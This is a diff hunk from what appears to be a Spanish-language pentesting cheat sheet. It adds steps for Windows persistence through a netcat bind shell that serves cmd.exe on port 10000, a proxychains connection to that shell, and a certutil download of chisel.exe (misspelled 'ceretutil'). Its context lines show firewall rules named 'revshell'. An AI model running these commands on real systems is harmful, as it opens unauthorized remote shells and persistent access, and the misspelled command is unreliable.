@@ -673,6 +673,24 @@ netsh advfirewall firewall add rule name=revshell protocol=TCP dir=in localport=
 netsh advfirewall firewall add rule name=revshell protocol=TCP dir=out localport=4444 action=allow (OUT)
 ```
 
+#### 6.7.4. Establecer una "persistencia" en Windows
+
+Enviamos a segundo plano el proceso, abriendo un puerto para luego tener acceso más facil.
+
+```powershell
+start "" /B nc.exe -l -p 10000 -e cmd.exe
+```
+
+```bash
+proxychains rlwrap nc 10.10.10.6 -p 10000
+```
+
+#### 6.7.5. Descargar un archivo desde Windows
+
+```powershell
+ceretutil -split -urlcache -f http://192.168.1.10/chisel.exe chisel.exe
+```
+
 ### 7. Explotación Web
 
 #### SQLMap (SQL Injection)
